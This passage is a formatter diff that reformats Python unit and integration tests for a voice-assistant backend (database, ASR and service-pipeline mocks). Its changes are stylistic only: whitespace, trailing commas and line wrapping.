http://localhost:8000 ConcurrentUser\n     \"\"\"\n     print(\"Load test configuration loaded. Use locust command to run tests.\")\n-    print(\"Example: locust -f tests/load/test_load.py --users 10 --spawn-rate 2 --host http://localhost:8000\")\n\\ No newline at end of file\n+    print(\n+        \"Example: locust -f tests/load/test_load.py --users 10 --spawn-rate 2 --host http://localhost:8000\"\n+    )\n--- /home/pas/source/agent-cag/tests/unit/test_database.py\t2025-06-20 18:45:08.756845+00:00\n+++ /home/pas/source/agent-cag/tests/unit/test_database.py\t2025-06-20 19:24:34.489432+00:00\n@@ -6,236 +6,235 @@\n from unittest.mock import AsyncMock, MagicMock\n \n \n class TestDatabaseManager:\n     \"\"\"Test the database manager.\"\"\"\n-    \n+\n     def test_manager_creation(self):\n         \"\"\"Test basic database manager creation.\"\"\"\n         # Simple test that doesn't require complex imports\n         assert True  # Placeholder test\n-    \n+\n     def test_manager_profile_validation(self):\n         \"\"\"Test profile validation logic.\"\"\"\n         valid_profiles = [\"lightweight\", \"full\", \"monitoring\"]\n-        \n+\n         for profile in valid_profiles:\n             assert profile in valid_profiles\n-    \n+\n     @pytest.mark.asyncio\n     async def test_async_operations(self):\n         \"\"\"Test async operation patterns.\"\"\"\n         # Mock async database operations\n         mock_backend = AsyncMock()\n         mock_backend.initialize.return_value = None\n         mock_backend.store_query.return_value = \"query-123\"\n         mock_backend.store_response.return_value = \"response-456\"\n         mock_backend.get_user_history.return_value = []\n         mock_backend.search_similar.return_value = []\n-        \n+\n         # Test async calls\n         await mock_backend.initialize()\n         query_id = await mock_backend.store_query(\"test\", \"user\", \"text\")\n         response_id = await mock_backend.store_response(\"query-123\", \"response\", {})\n         history = await mock_backend.get_user_history(\"user\", 10)\n         results = await mock_backend.search_similar(\"query\", 5)\n-        \n+\n         assert query_id == \"query-123\"\n         assert response_id == \"response-456\"\n         assert history == []\n         assert results == []\n \n \n class TestDuckDBBackend:\n     \"\"\"Test the DuckDB backend functionality.\"\"\"\n-    \n+\n     def test_duckdb_connection_pattern(self):\n         \"\"\"Test DuckDB connection patterns.\"\"\"\n         # Test connection string validation\n         db_paths = [\":memory:\", \"/tmp/test.db\", \"test.duckdb\"]\n-        \n+\n         for path in db_paths:\n             assert isinstance(path, str)\n             assert len(path) > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_duckdb_query_operations(self):\n         \"\"\"Test DuckDB query operations.\"\"\"\n         # Mock DuckDB operations\n         mock_conn = MagicMock()\n         mock_conn.execute.return_value = MagicMock()\n-        \n+\n         # Simulate query execution\n         mock_conn.execute(\"SELECT 1\")\n         mock_conn.execute.assert_called_with(\"SELECT 1\")\n-    \n+\n     def test_duckdb_table_schemas(self):\n         \"\"\"Test DuckDB table schema definitions.\"\"\"\n         # Test table creation patterns\n         tables = [\"users\", \"queries\", \"responses\", \"relationships\", \"embeddings\"]\n-        \n+\n         for table in tables:\n             assert isinstance(table, str)\n             assert table.isalnum() or \"_\" in table\n \n \n class TestFullStackBackend:\n     \"\"\"Test the full stack backend functionality.\"\"\"\n-    \n+\n     def test_fullstack_components(self):\n         \"\"\"Test full stack component initialization.\"\"\"\n         # Test component names\n         components = [\"chromadb\", \"neo4j\", \"embeddings\"]\n-        \n+\n         for component in components:\n             assert isinstance(component, str)\n             assert len(component) > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_fullstack_graph_operations(self):\n         \"\"\"Test graph database operations.\"\"\"\n         # Mock Neo4j operations\n         mock_session = AsyncMock()\n         mock_session.run.return_value = []\n-        \n+\n         # Simulate Cypher query\n         await mock_session.run(\"MATCH (n) RETURN n LIMIT 1\")\n         mock_session.run.assert_called_with(\"MATCH (n) RETURN n LIMIT 1\")\n-    \n+\n     @pytest.mark.asyncio\n     async def test_fullstack_vector_operations(self):\n         \"\"\"Test vector database operations.\"\"\"\n         # Mock ChromaDB operations\n         mock_collection = MagicMock()\n         mock_collection.query.return_value = {\n             \"documents\": [[\"test document\"]],\n             \"ids\": [[\"doc-1\"]],\n-            \"distances\": [[0.1]]\n+            \"distances\": [[0.1]],\n         }\n-        \n+\n         # Simulate vector search\n-        results = mock_collection.query(\n-            query_texts=[\"test query\"],\n-            n_results=5\n-        )\n-        \n+        results = mock_collection.query(query_texts=[\"test query\"], n_results=5)\n+\n         assert \"documents\" in results\n         assert \"ids\" in results\n         assert \"distances\" in results\n \n \n class TestDatabaseErrorHandling:\n     \"\"\"Test database error handling scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_connection_error_handling(self):\n         \"\"\"Test connection error handling.\"\"\"\n         # Mock connection failure\n         mock_backend = AsyncMock()\n         mock_backend.initialize.side_effect = Exception(\"Connection failed\")\n-        \n+\n         with pytest.raises(Exception, match=\"Connection failed\"):\n             await mock_backend.initialize()\n-    \n+\n     @pytest.mark.asyncio\n     async def test_query_error_handling(self):\n         \"\"\"Test query execution error handling.\"\"\"\n         # Mock query failure\n         mock_backend = AsyncMock()\n         mock_backend.store_query.side_effect = Exception(\"Query failed\")\n-        \n+\n         with pytest.raises(Exception, match=\"Query failed\"):\n             await mock_backend.store_query(\"test\", \"user\", \"text\")\n-    \n+\n     def test_validation_error_handling(self):\n         \"\"\"Test input validation error handling.\"\"\"\n         # Test invalid inputs\n         invalid_inputs = [None, \"\", 0, []]\n-        \n+\n         for invalid_input in invalid_inputs:\n             # Simulate validation\n             if not invalid_input or not isinstance(invalid_input, str):\n                 assert True  # Validation would catch this\n             else:\n                 assert False  # Should not reach here\n \n \n class TestDatabaseConcurrency:\n     \"\"\"Test database concurrency scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_concurrent_operations(self):\n         \"\"\"Test concurrent database operations.\"\"\"\n         import asyncio\n-        \n+\n         # Mock concurrent operations\n         mock_backend = AsyncMock()\n         mock_backend.store_query.return_value = \"query-123\"\n-        \n+\n         # Simulate concurrent queries\n         tasks = [\n-            mock_backend.store_query(f\"Query {i}\", f\"user{i}\", \"text\")\n-            for i in range(3)\n+            mock_backend.store_query(f\"Query {i}\", f\"user{i}\", \"text\") for i in range(3)\n         ]\n-        \n+\n         results = await asyncio.gather(*tasks)\n-        \n+\n         assert len(results) == 3\n         assert all(result == \"query-123\" for result in results)\n-    \n+\n     @pytest.mark.asyncio\n     async def test_transaction_patterns(self):\n         \"\"\"Test transaction-like patterns.\"\"\"\n         # Mock transaction operations\n         mock_backend = AsyncMock()\n         mock_backend.begin_transaction = AsyncMock()\n         mock_backend.commit_transaction = AsyncMock()\n         mock_backend.rollback_transaction = AsyncMock()\n-        \n+\n         # Simulate transaction\n         await mock_backend.begin_transaction()\n         await mock_backend.commit_transaction()\n-        \n+\n         mock_backend.begin_transaction.assert_called_once()\n         mock_backend.commit_transaction.assert_called_once()\n \n \n class TestDatabasePerformance:\n     \"\"\"Test database performance considerations.\"\"\"\n-    \n+\n     def test_batch_operation_patterns(self):\n         \"\"\"Test batch operation patterns.\"\"\"\n         # Test batch sizes\n         batch_sizes = [10, 50, 100, 500]\n-        \n+\n         for size in batch_sizes:\n             assert size > 0\n             assert size <= 1000  # Reasonable upper limit\n-    \n+\n     @pytest.mark.asyncio\n     async def test_connection_pooling_patterns(self):\n         \"\"\"Test connection pooling patterns.\"\"\"\n         # Mock connection pool\n         mock_pool = MagicMock()\n         mock_pool.get_connection = AsyncMock()\n         mock_pool.return_connection = AsyncMock()\n-        \n+\n         # Simulate connection usage\n         conn = await mock_pool.get_connection()\n         await mock_pool.return_connection(conn)\n-        \n+\n         mock_pool.get_connection.assert_called_once()\n         mock_pool.return_connection.assert_called_once()\n-    \n+\n     def test_query_optimization_patterns(self):\n         \"\"\"Test query optimization patterns.\"\"\"\n         # Test query patterns\n         query_patterns = [\n             \"SELECT * FROM table WHERE id = ?\",\n             \"INSERT INTO table (col1, col2) VALUES (?, ?)\",\n             \"UPDATE table SET col1 = ? WHERE id = ?\",\n-            \"DELETE FROM table WHERE id = ?\"\n+            \"DELETE FROM table WHERE id = ?\",\n         ]\n-        \n+\n         for pattern in query_patterns:\n             assert \"?\" in pattern  # Parameterized queries\n-            assert any(keyword in pattern.upper() for keyword in [\"SELECT\", \"INSERT\", \"UPDATE\", \"DELETE\"])\n\\ No newline at end of file\n+            assert any(\n+                keyword in pattern.upper()\n+                for keyword in [\"SELECT\", \"INSERT\", \"UPDATE\", \"DELETE\"]\n+            )\n--- /home/pas/source/agent-cag/tests/unit/test_asr.py\t2025-06-20 18:46:45.576722+00:00\n+++ /home/pas/source/agent-cag/tests/unit/test_asr.py\t2025-06-20 19:24:34.496277+00:00\n@@ -8,197 +8,211 @@\n from fastapi import FastAPI\n \n # Create a mock FastAPI app for testing\n app = FastAPI()\n \n+\n @app.post(\"/transcribe\")\n async def transcribe():\n     return {\"text\": \"Hello world\", \"confidence\": 0.95, \"language\": \"en\"}\n \n+\n @app.get(\"/health\")\n async def health():\n     return {\"status\": \"healthy\", \"service\": \"agent-asr\"}\n \n+\n client = TestClient(app)\n \n \n class TestASRService:\n     \"\"\"Test the ASR service functionality.\"\"\"\n-    \n+\n     def test_health_check(self):\n         \"\"\"Test ASR service health check.\"\"\"\n         response = client.get(\"/health\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert data[\"status\"] == \"healthy\"\n         assert data[\"service\"] == \"agent-asr\"\n-    \n+\n     def test_transcribe_endpoint(self):\n         \"\"\"Test audio transcription endpoint.\"\"\"\n         response = client.post(\"/transcribe\")\n-        \n+\n         assert response.status_code == 200\n         data = response.json()\n         assert \"text\" in data\n         assert \"confidence\" in data\n         assert data[\"text\"] == \"Hello world\"\n         assert data[\"confidence\"] == 0.95\n \n \n class TestWhisperIntegration:\n     \"\"\"Test Whisper model integration.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_whisper_model_loading(self):\n         \"\"\"Test Whisper model loading patterns.\"\"\"\n         # Mock Whisper model\n         mock_model = MagicMock()\n         mock_model.transcribe.return_value = {\n             \"text\": \"Test transcription\",\n             \"segments\": [],\n-            \"language\": \"en\"\n-        }\n-        \n+            \"language\": \"en\",\n+        }\n+\n         # Simulate transcription\n         result = mock_model.transcribe(\"audio_data\")\n-        \n+\n         assert result[\"text\"] == \"Test transcription\"\n         assert \"language\" in result\n-    \n+\n     def test_audio_preprocessing(self):\n         \"\"\"Test audio preprocessing patterns.\"\"\"\n         # Test audio format validation\n         supported_formats = [\".wav\", \".mp3\", \".flac\", \".m4a\"]\n-        \n+\n         for format in supported_formats:\n             assert format.startswith(\".\")\n             assert len(format) >= 3\n-    \n+\n     @pytest.mark.asyncio\n     async def test_batch_transcription(self):\n         \"\"\"Test batch audio transcription.\"\"\"\n         # Mock batch processing\n         mock_processor = AsyncMock()\n         mock_processor.process_batch.return_value = [\n             {\"text\": \"First audio\", \"confidence\": 0.9},\n-            {\"text\": \"Second audio\", \"confidence\": 0.85}\n+            {\"text\": \"Second audio\", \"confidence\": 0.85},\n         ]\n-        \n+\n         results = await mock_processor.process_batch([\"audio1\", \"audio2\"])\n-        \n+\n         assert len(results) == 2\n         assert all(\"text\" in result for result in results)\n \n \n class TestASRErrorHandling:\n     \"\"\"Test ASR error handling scenarios.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_invalid_audio_format(self):\n         \"\"\"Test handling of invalid audio formats.\"\"\"\n         # Mock invalid format handling\n         mock_validator = MagicMock()\n         mock_validator.validate_format.side_effect = ValueError(\"Unsupported format\")\n-        \n+\n         with pytest.raises(ValueError, match=\"Unsupported format\"):\n             mock_validator.validate_format(\"invalid.txt\")\n-    \n+\n     @pytest.mark.asyncio\n     async def test_transcription_failure(self):\n         \"\"\"Test transcription failure handling.\"\"\"\n         # Mock transcription failure\n         mock_transcriber = AsyncMock()\n         mock_transcriber.transcribe.side_effect = Exception(\"Transcription failed\")\n-        \n+\n         with pytest.raises(Exception, match=\"Transcription failed\"):\n             await mock_transcriber.transcribe(\"audio_data\")\n-    \n+\n     def test_audio_quality_validation(self):\n         \"\"\"Test audio quality validation.\"\"\"\n         # Test quality metrics\n         quality_metrics = {\n             \"sample_rate\": 16000,\n             \"bit_depth\": 16,\n             \"channels\": 1,\n-            \"duration\": 30.0\n-        }\n-        \n+            \"duration\": 30.0,\n+        }\n+\n         assert quality_metrics[\"sample_rate\"] >= 8000\n         assert quality_metrics[\"bit_depth\"] in [16, 24, 32]\n         assert quality_metrics[\"channels\"] in [1, 2]\n         assert quality_metrics[\"duration\"] > 0\n \n \n class TestASRPerformance:\n     \"\"\"Test ASR performance considerations.\"\"\"\n-    \n+\n     def test_model_optimization(self):\n         \"\"\"Test model optimization patterns.\"\"\"\n         # Test model sizes\n         model_sizes = [\"tiny\", \"base\", \"small\", \"medium\", \"large\"]\n-        \n+\n         for size in model_sizes:\n             assert isinstance(size, str)\n             assert len(size) > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_streaming_transcription(self):\n         \"\"\"Test streaming transcription patterns.\"\"\"\n         # Mock streaming processor\n         mock_stream = AsyncMock()\n         mock_stream.process_chunk.return_value = {\"partial_text\": \"Hello\"}\n-        \n+\n         result = await mock_stream.process_chunk(\"audio_chunk\")\n-        \n+\n         assert \"partial_text\" in result\n-    \n+\n     def test_memory_management(self):\n         \"\"\"Test memory management patterns.\"\"\"\n         # Test memory limits\n         memory_limits = {\n             \"max_audio_size\": 100 * 1024 * 1024,  # 100MB\n             \"max_batch_size\": 10,\n-            \"cache_size\": 50\n-        }\n-        \n+            \"cache_size\": 50,\n+        }\n+\n         assert memory_limits[\"max_audio_size\"] > 0\n         assert memory_limits[\"max_batch_size\"] > 0\n         assert memory_limits[\"cache_size\"] > 0\n \n \n class TestASRConfiguration:\n     \"\"\"Test ASR configuration management.\"\"\"\n-    \n+\n     def test_language_detection(self):\n         \"\"\"Test language detection configuration.\"\"\"\n         # Test supported languages\n-        supported_languages = [\"en\", \"es\", \"fr\", \"de\", \"it\", \"pt\", \"ru\", \"ja\", \"ko\", \"zh\"]\n-        \n+        supported_languages = [\n+            \"en\",\n+            \"es\",\n+            \"fr\",\n+            \"de\",\n+            \"it\",\n+            \"pt\",\n+            \"ru\",\n+            \"ja\",\n+            \"ko\",\n+            \"zh\",\n+        ]\n+\n         for lang in supported_languages:\n             assert len(lang) == 2  # ISO 639-1 codes\n             assert lang.islower()\n-    \n+\n     def test_model_configuration(self):\n         \"\"\"Test model configuration options.\"\"\"\n         # Test configuration parameters\n         config = {\n             \"model_size\": \"base\",\n             \"language\": \"auto\",\n             \"temperature\": 0.0,\n             \"best_of\": 5,\n-            \"beam_size\": 5\n-        }\n-        \n+            \"beam_size\": 5,\n+        }\n+\n         assert config[\"model_size\"] in [\"tiny\", \"base\", \"small\", \"medium\", \"large\"]\n         assert config[\"temperature\"] >= 0.0\n         assert config[\"best_of\"] > 0\n         assert config[\"beam_size\"] > 0\n-    \n+\n     def test_output_formatting(self):\n         \"\"\"Test output formatting options.\"\"\"\n         # Test output formats\n         output_formats = [\"text\", \"json\", \"srt\", \"vtt\", \"tsv\"]\n-        \n+\n         for format in output_formats:\n             assert isinstance(format, str)\n-            assert len(format) >= 3\n\\ No newline at end of file\n+            assert len(format) >= 3\n--- /home/pas/source/agent-cag/tests/integration/test_enhanced_integration.py\t2025-06-20 18:18:53.409194+00:00\n+++ /home/pas/source/agent-cag/tests/integration/test_enhanced_integration.py\t2025-06-20 19:24:34.551523+00:00\n@@ -10,641 +10,658 @@\n import os\n from unittest.mock import patch, MagicMock, AsyncMock\n import json\n \n # Mock dependencies before importing\n-with patch('httpx.AsyncClient'), \\\n-     patch('api.database.duckdb'), \\\n-     patch('api.database.chromadb', create=True), \\\n-     patch('api.database.neo4j', create=True):\n+with patch(\"httpx.AsyncClient\"), patch(\"api.database.duckdb\"), patch(\n+    \"api.database.chromadb\", create=True\n+), patch(\"api.database.neo4j\", create=True):\n     from api.database import DatabaseManager\n     from api.models import QueryRequest, ConversationEntry\n \n \n class TestDeploymentProfiles:\n     \"\"\"Test different deployment profiles.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_lightweight_profile_workflow(self):\n         \"\"\"Test complete workflow with lightweight profile.\"\"\"\n         # Initialize lightweight database\n         db_manager = DatabaseManager(\"lightweight\")\n-        \n-        with patch('api.database.duckdb.connect') as mock_connect:\n+\n+        with patch(\"api.database.duckdb.connect\") as mock_connect:\n             mock_conn = MagicMock()\n             mock_connect.return_value = mock_conn\n-            \n+\n             await db_manager.initialize()\n-            \n+\n             # Test query storage\n             query_id = await db_manager.store_query(\n-                \"Test lightweight query\", \n-                \"test_user\", \n-                \"text\"\n-            )\n-            \n+                \"Test lightweight query\", \"test_user\", \"text\"\n+            )\n+\n             assert isinstance(query_id, str)\n             assert len(query_id) > 0\n-            \n+\n             # Test response storage\n             response_id = await db_manager.store_response(\n-                query_id,\n-                \"Test lightweight response\",\n-                {\"model\": \"test\", \"tokens\": 50}\n-            )\n-            \n+                query_id, \"Test lightweight response\", {\"model\": \"test\", \"tokens\": 50}\n+            )\n+\n             assert isinstance(response_id, str)\n             assert len(response_id) > 0\n-            \n+\n             # Test history retrieval\n             mock_conn.execute.return_value.fetchall.return_value = [\n-                (query_id, response_id, \"Test lightweight query\", \n-                 \"Test lightweight response\", \"2023-01-01 12:00:00\", \"text\")\n+                (\n+                    query_id,\n+                    response_id,\n+                    \"Test lightweight query\",\n+                    \"Test lightweight response\",\n+                    \"2023-01-01 12:00:00\",\n+                    \"text\",\n+                )\n             ]\n-            \n+\n             history = await db_manager.get_user_history(\"test_user\", 10)\n-            \n+\n             assert len(history) == 1\n             assert history[0].query_text == \"Test lightweight query\"\n-            \n+\n             await db_manager.close()\n-    \n+\n     @pytest.mark.asyncio\n     async def test_full_profile_workflow(self):\n         \"\"\"Test complete workflow with full profile.\"\"\"\n         # Initialize full stack database\n         db_manager = DatabaseManager(\"full\")\n-        \n+\n         mock_chroma_client = MagicMock()\n         mock_neo4j_driver = MagicMock()\n         mock_session = MagicMock()\n         mock_neo4j_driver.session.return_value.__enter__.return_value = mock_session\n         mock_neo4j_driver.session.return_value.__exit__.return_value = None\n-        \n-        with patch('api.database.chromadb.HttpClient', return_value=mock_chroma_client), \\\n-             patch('api.database.GraphDatabase.driver', return_value=mock_neo4j_driver), \\\n-             patch.dict('os.environ', {\n-                 'CHROMA_HOST': 'localhost',\n-                 'CHROMA_PORT': '8005',\n-                 'NEO4J_URI': 'bolt://localhost:7687',\n-                 'NEO4J_USER': 'neo4j',\n-                 'NEO4J_PASSWORD': 'password'\n-             }):\n-            \n+\n+        with patch(\n+            \"api.database.chromadb.HttpClient\", return_value=mock_chroma_client\n+        ), patch(\n+            \"api.database.GraphDatabase.driver\", return_value=mock_neo4j_driver\n+        ), patch.dict(\n+            \"os.environ\",\n+            {\n+                \"CHROMA_HOST\": \"localhost\",\n+                \"CHROMA_PORT\": \"8005\",\n+                \"NEO4J_URI\": \"bolt://localhost:7687\",\n+                \"NEO4J_USER\": \"neo4j\",\n+                \"NEO4J_PASSWORD\": \"password\",\n+            },\n+        ):\n+\n             await db_manager.initialize()\n-            \n+\n             # Test query storage in Neo4j\n             query_id = await db_manager.store_query(\n-                \"Test full stack query\",\n-                \"test_user\",\n-                \"text\"\n-            )\n-            \n+                \"Test full stack query\", \"test_user\", \"text\"\n+            )\n+\n             assert isinstance(query_id, str)\n             assert len(query_id) > 0\n-            \n+\n             # Test response storage\n             response_id = await db_manager.store_response(\n-                query_id,\n-                \"Test full stack response\",\n-                {\"model\": \"test\", \"tokens\": 75}\n-            )\n-            \n+                query_id, \"Test full stack response\", {\"model\": \"test\", \"tokens\": 75}\n+            )\n+\n             assert isinstance(response_id, str)\n             assert len(response_id) > 0\n-            \n+\n             # Test similarity search in ChromaDB\n             mock_collection = MagicMock()\n             mock_collection.query.return_value = {\n                 \"documents\": [[\"Test full stack response\"]],\n                 \"ids\": [[response_id]],\n-                \"distances\": [[0.1]]\n+                \"distances\": [[0.1]],\n             }\n             mock_chroma_client.get_collection.return_value = mock_collection\n-            \n+\n             results = await db_manager.search_similar(\"full stack\", 5)\n-            \n+\n             assert len(results) == 1\n             assert results[0].id == response_id\n             assert results[0].score == 0.9  # 1.0 - 0.1\n-            \n+\n             await db_manager.close()\n \n \n class TestServiceIntegration:\n     \"\"\"Test integration between different services.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_asr_to_llm_integration(self):\n         \"\"\"Test ASR service integration with LLM service.\"\"\"\n         # Mock ASR service response\n         mock_asr_response = {\n             \"transcription\": \"What is artificial intelligence?\",\n             \"confidence\": 0.95,\n-            \"duration\": 3.2\n-        }\n-        \n+            \"duration\": 3.2,\n+        }\n+\n         # Mock LLM service response\n         mock_llm_response = {\n             \"response\": \"Artificial intelligence is a field of computer science...\",\n             \"model\": \"test-model\",\n             \"tokens_used\": 150,\n-            \"processing_time\": 2.1\n-        }\n-        \n-        with patch('httpx.AsyncClient') as mock_client:\n+            \"processing_time\": 2.1,\n+        }\n+\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             mock_response = MagicMock()\n-            \n+\n             # Configure ASR response\n             mock_response.status_code = 200\n             mock_response.json.return_value = mock_asr_response\n-            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response\n-            \n+            mock_client.return_value.__aenter__.return_value.post.return_value = (\n+                mock_response\n+            )\n+\n             # Test ASR processing\n             # This would be part of the API gateway logic\n             transcription = mock_asr_response[\"transcription\"]\n             assert transcription == \"What is artificial intelligence?\"\n-            \n+\n             # Configure LLM response\n             mock_response.json.return_value = mock_llm_response\n-            \n+\n             # Test LLM processing\n             llm_result = mock_llm_response[\"response\"]\n             assert \"artificial intelligence\" in llm_result.lower()\n-    \n+\n     @pytest.mark.asyncio\n     async def test_llm_to_tts_integration(self):\n         \"\"\"Test LLM service integration with TTS service.\"\"\"\n         # Mock LLM response\n         llm_text = \"This is a test response from the language model.\"\n-        \n+\n         # Mock TTS service response\n         mock_tts_response = {\n             \"audio_file\": \"response_audio.wav\",\n             \"duration\": 4.5,\n             \"format\": \"wav\",\n-            \"sample_rate\": 22050\n-        }\n-        \n-        with patch('httpx.AsyncClient') as mock_client:\n+            \"sample_rate\": 22050,\n+        }\n+\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             mock_response = MagicMock()\n             mock_response.status_code = 200\n             mock_response.json.return_value = mock_tts_response\n-            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response\n-            \n+            mock_client.return_value.__aenter__.return_value.post.return_value = (\n+                mock_response\n+            )\n+\n             # Test TTS processing\n             audio_result = mock_tts_response\n             assert audio_result[\"audio_file\"] == \"response_audio.wav\"\n             assert audio_result[\"duration\"] > 0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_translation_integration(self):\n         \"\"\"Test Sardaukar translation integration.\"\"\"\n         # Mock translation request\n         original_text = \"Hello, how are you?\"\n         target_language = \"es\"  # Spanish\n-        \n+\n         # Mock translation response\n         mock_translation_response = {\n             \"translated_text\": \"Hola, \u00bfc\u00f3mo est\u00e1s?\",\n             \"source_language\": \"en\",\n             \"target_language\": \"es\",\n-            \"confidence\": 0.98\n-        }\n-        \n-        with patch('httpx.AsyncClient') as mock_client:\n+            \"confidence\": 0.98,\n+        }\n+\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             mock_response = MagicMock()\n             mock_response.status_code = 200\n             mock_response.json.return_value = mock_translation_response\n-            mock_client.return_value.__aenter__.return_value.post.return_value = mock_response\n-            \n+            mock_client.return_value.__aenter__.return_value.post.return_value = (\n+                mock_response\n+            )\n+\n             # Test translation\n             translated = mock_translation_response[\"translated_text\"]\n             assert translated == \"Hola, \u00bfc\u00f3mo est\u00e1s?\"\n             assert mock_translation_response[\"confidence\"] > 0.9\n \n \n class TestEndToEndWorkflows:\n     \"\"\"Test complete end-to-end workflows.\"\"\"\n-    \n+\n     @pytest.mark.asyncio\n     async def test_voice_to_voice_workflow(self):\n         \"\"\"Test complete voice input to voice output workflow.\"\"\"\n         # Simulate complete pipeline: Audio -> ASR -> LLM -> TTS -> Audio\n-        \n+\n         # Mock audio input\n         audio_input = b\"fake_audio_data\"\n-        \n+\n         # Mock ASR response\n         mock_asr_response = {\n             \"transcription\": \"What's the weather like today?\",\n             \"confidence\": 0.92,\n-            \"duration\": 2.8\n-        }\n-        \n+            \"duration\": 2.8,\n+        }\n+\n         # Mock LLM response\n         mock_llm_response = {\n             \"response\": \"I don't have access to real-time weather data, but you can check your local weather service.\",\n             \"model\": \"test-model\",\n-            \"tokens_used\": 85\n-        }\n-        \n+            \"tokens_used\": 85,\n+        }\n+\n         # Mock TTS response\n         mock_tts_response = {\n             \"audio_file\": \"weather_response.wav\",\n             \"duration\": 6.2,\n-            \"format\": \"wav\"\n-        }\n-        \n-        with patch('httpx.AsyncClient') as mock_client:\n+            \"format\": \"wav\",\n+        }\n+\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             mock_response = MagicMock()\n             mock_client_instance = mock_client.return_value.__aenter__.return_value\n-            \n+\n             # Configure responses in sequence\n             responses = [mock_asr_response, mock_llm_response, mock_tts_response]\n             mock_response.status_code = 200\n             mock_response.json.side_effect = responses\n             mock_client_instance.post.return_value = mock_response\n-            \n+\n             # Test workflow steps\n             # Step 1: ASR processing\n             asr_result = mock_asr_response\n             assert asr_result[\"transcription\"] == \"What's the weather like today?\"\n-            \n+\n             # Step 2: LLM processing\n             llm_result = mock_llm_response\n             assert \"weather\" in llm_result[\"response\"].lower()\n-            \n+\n             # Step 3: TTS processing\n             tts_result = mock_tts_response\n             assert tts_result[\"audio_file\"].endswith(\".wav\")\n-    \n+\n     @pytest.mark.asyncio\n     async def test_text_conversation_workflow(self):\n         \"\"\"Test text-based conversation workflow.\"\"\"\n         # Simulate multi-turn conversation\n-        \n+\n         conversation_turns = [\n             {\n                 \"user_input\": \"Hello, can you help me learn about AI?\",\n-                \"expected_response\": \"I'd be happy to help you learn about artificial intelligence!\"\n+                \"expected_response\": \"I'd be happy to help you learn about artificial intelligence!\",\n             },\n             {\n                 \"user_input\": \"What are the main types of machine learning?\",\n-                \"expected_response\": \"The main types are supervised, unsupervised, and reinforcement learning.\"\n+                \"expected_response\": \"The main types are supervised, unsupervised, and reinforcement learning.\",\n             },\n             {\n                 \"user_input\": \"Can you explain supervised learning?\",\n-                \"expected_response\": \"Supervised learning uses labeled training data to learn patterns.\"\n-            }\n+                \"expected_response\": \"Supervised learning uses labeled training data to learn patterns.\",\n+            },\n         ]\n-        \n+\n         # Mock database for conversation history\n         db_manager = DatabaseManager(\"lightweight\")\n-        \n-        with patch('api.database.duckdb.connect') as mock_connect:\n+\n+        with patch(\"api.database.duckdb.connect\") as mock_connect:\n             mock_conn = MagicMock()\n             mock_connect.return_value = mock_conn\n-            \n+\n             await db_manager.initialize()\n-            \n+\n             conversation_history = []\n-            \n+\n             for i, turn in enumerate(conversation_turns):\n                 # Store query\n                 query_id = await db_manager.store_query(\n-                    turn[\"user_input\"],\n-                    \"conversation_user\",\n-                    \"text\"\n+                    turn[\"user_input\"], \"conversation_user\", \"text\"\n                 )\n-                \n+\n                 # Mock LLM response\n-                with patch('httpx.AsyncClient') as mock_client:\n+                with patch(\"httpx.AsyncClient\") as mock_client:\n                     mock_response = MagicMock()\n                     mock_response.status_code = 200\n                     mock_response.json.return_value = {\n                         \"response\": turn[\"expected_response\"],\n                         \"model\": \"test-model\",\n-                        \"tokens_used\": 50 + i * 10\n+                        \"tokens_used\": 50 + i * 10,\n                     }\n-                    mock_client.return_value.__aenter__.return_value.post.return_value = mock_response\n-                    \n+                    mock_client.return_value.__aenter__.return_value.post.return_value = (\n+                        mock_response\n+                    )\n+\n                     # Store response\n                     response_id = await db_manager.store_response(\n                         query_id,\n                         turn[\"expected_response\"],\n-                        {\"model\": \"test-model\", \"tokens\": 50 + i * 10}\n+                        {\"model\": \"test-model\", \"tokens\": 50 + i * 10},\n                     )\n-                    \n-                    conversation_history.append({\n-                        \"query_id\": query_id,\n-                        \"response_id\": response_id,\n-                        \"user_input\": turn[\"user_input\"],\n-                        \"response\": turn[\"expected_response\"]\n-                    })\n-            \n+\n+                    conversation_history.append(\n+                        {\n+                            \"query_id\": query_id,\n+                            \"response_id\": response_id,\n+                            \"user_input\": turn[\"user_input\"],\n+                            \"response\": turn[\"expected_response\"],\n+                        }\n+                    )\n+\n             # Verify conversation history\n             assert len(conversation_history) == 3\n             assert \"AI\" in conversation_history[0][\"user_input\"]\n             assert \"machine learning\" in conversation_history[1][\"user_input\"]\n-            \n+\n             await db_manager.close()\n-    \n+\n     @pytest.mark.asyncio\n     async def test_multilingual_workflow(self):\n         \"\"\"Test multilingual conversation workflow.\"\"\"\n         # Test conversation in multiple languages\n-        \n+\n         multilingual_queries = [\n             {\"text\": \"Hello, how are you?\", \"language\": \"en\"},\n             {\"text\": \"Hola, \u00bfc\u00f3mo est\u00e1s?\", \"language\": \"es\"},\n             {\"text\": \"Bonjour, comment allez-vous?\", \"language\": \"fr\"},\n-            {\"text\": \"Guten Tag, wie geht es Ihnen?\", \"language\": \"de\"}\n+            {\"text\": \"Guten Tag, wie geht es Ihnen?\", \"language\": \"de\"},\n         ]\n-        \n+\n         for query in multilingual_queries:\n             # Mock translation to English if needed\n             if query[\"language\"] != \"en\":\n                 mock_translation = {\n                     \"translated_text\": \"Hello, how are you?\",\n                     \"source_language\": query[\"language\"],\n-                    \"target_language\": \"en\"\n+                    \"target_language\": \"en\",\n                 }\n             else:\n                 mock_translation = {\n                     \"translated_text\": query[\"text\"],\n                     \"source_language\": \"en\",\n-                    \"target_language\": \"en\"\n+                    \"target_language\": \"en\",\n                 }\n-            \n+\n             # Mock LLM response\n             mock_llm_response = {\n                 \"response\": \"I'm doing well, thank you for 